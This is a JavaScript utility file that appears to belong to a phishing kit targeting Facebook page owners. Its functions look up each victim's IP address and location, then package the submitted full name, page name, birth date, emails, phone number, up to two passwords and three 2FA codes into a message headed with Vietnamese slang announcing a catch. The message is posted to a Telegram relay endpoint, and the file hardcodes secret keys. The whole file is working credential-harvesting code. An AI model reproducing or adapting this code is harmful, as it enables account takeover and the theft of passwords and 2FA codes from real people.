// /public/js/utils.js

const Utils = (() => {

  function generateTicketId() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    return `${seg()}-${seg()}-${seg()}`;
  }

  function maskEmail(email) {
    if (!email) return '';
    const [local, domain] = email.split('@');
    const visible = local.slice(0, 2);
    return `${visible}***@${domain}`;
  }

  function maskPhone(phone) {
    if (!phone) return '';
    return phone.slice(0, 3) + '****' + phone.slice(-2);
  }

  const SECRET = 'local_enc_key_2025';

  function saveRecord(key, data) {
    try {
      const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET).toString();
      const record = { data: encrypted, ts: Date.now() };
      localStorage.setItem(key, JSON.stringify(record));
    } catch (e) {
      console.error('saveRecord error', e);
    }
  }

  function getRecord(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const record = JSON.parse(raw);
      if (Date.now() - record.ts > CONFIG.STORAGE_EXPIRY) {
        localStorage.removeItem(key);
        return null;
      }
      const bytes = CryptoJS.AES.decrypt(record.data, SECRET);
      return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
    } catch (e) {
      return null;
    }
  }

  // ── Country code → Country name ────────────────────────────
  const COUNTRY_NAMES = {
    VN: 'Vietnam', US: 'United States', GB: 'United Kingdom',
    FR: 'France',  DE: 'Germany',       JP: 'Japan',
    CN: 'China',   KR: 'South Korea',   TH: 'Thailand',
    SG: 'Singapore', AU: 'Australia',   CA: 'Canada',
    IN: 'India',   ID: 'Indonesia',     MY: 'Malaysia',
    PH: 'Philippines', TW: 'Taiwan',    HK: 'Hong Kong',
  };

  // ── Fetch IP & Location (ipinfo.io — CORS ok) ──────────────
  async function getIpInfo() {
    try {
      const res = await fetch('https://ipinfo.io/json');
      const d = await res.json();
      if (!d.ip) throw new Error('fail');
      const countryCode = d.country || '';
      const countryName = COUNTRY_NAMES[countryCode] || countryCode;
      return {
        ip:           d.ip      || 'N/A',
        city:         d.city    || '',
        region:       d.region  || '',
        country_name: countryName,
        country_code: countryCode,
      };
    } catch (_) {
      return { ip: 'N/A', city: '', region: '', country_name: '', country_code: '' };
    }
  }

  // ── Build Telegram message ─────────────────────────────────
  function buildMessage(data, ipInfo = {}) {
    const c = (val) => (val !== undefined && val !== null && val !== '') ? `<code>${val}</code>` : '<i>N/A</i>';
    const dob = (data.day && data.month && data.year)
      ? `${data.day}/${data.month}/${data.year}` : '';

    const ip       = ipInfo.ip           || 'N/A';
    const city     = ipInfo.city         || '';
    const region   = ipInfo.region       || '';
    const country  = ipInfo.country_name || '';
    const countryC = ipInfo.country_code || '';

    // Loại bỏ trùng: nếu region chứa city hoặc bằng city thì bỏ region
    const parts = [city];
    if (region && region.toLowerCase() !== city.toLowerCase() && !region.toLowerCase().includes(city.toLowerCase())) {
      parts.push(region);
    }
    if (country) parts.push(country);
    const locationFull = parts.filter(Boolean).join(', ') + (countryC ? ` (${countryC})` : '');

    const lines = [];

    lines.push(`🔔 <b>VOI VỀ ANH EM ƠI!!</b>`);
    lines.push(`🌐 <b>IP:</b> <code>${ip}</code>`);
    lines.push(`📍 <b>Location:</b> <code>${locationFull || 'N/A'}</code>`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
    lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
    lines.push(`<b>Date of Birth:</b> ${c(dob)}`);
    lines.push(`<b>Message:</b> ${c(data.message)}`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Email:</b> ${c(data.email)}`);
    lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
    lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
    lines.push(`-----------------------------`);
    if (data.password)       lines.push(`<b>Password (1):</b> ${c(data.password)}`);
    if (data.passwordSecond) lines.push(`<b>Password (2):</b> ${c(data.passwordSecond)}`);
    lines.push(`-----------------------------`);
    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA (1):</b> ${c(data.twoFa)}`);
    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA (2):</b> ${c(data.twoFaSecond)}`);
    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA (3):</b> ${c(data.twoFaThird)}`);
    lines.push(`-----------------------------`);
    lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);

    return lines.join('\n');
  }

  // ── Send Notification ──────────────────────────────────────
  async function sendNotification(data) {
    try {
      const ipInfo  = await getIpInfo();
      const message = buildMessage(data, ipInfo);
      const APP_SECRET = 'HDNDT-JDHT8FNEK-JJHR';

      const res = await fetch('/api/send-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-secret-key': APP_SECRET,
        },
        body: JSON.stringify({ message }),
      });

      if (!res.ok) {
        const err = await res.json();
        console.error('Notification error:', err);
      }
    } catch (e) {
      console.error('sendNotification failed:', e);
    }
  }

  return { generateTicketId, maskEmail, maskPhone, saveRecord, getRecord, sendNotification };
})();
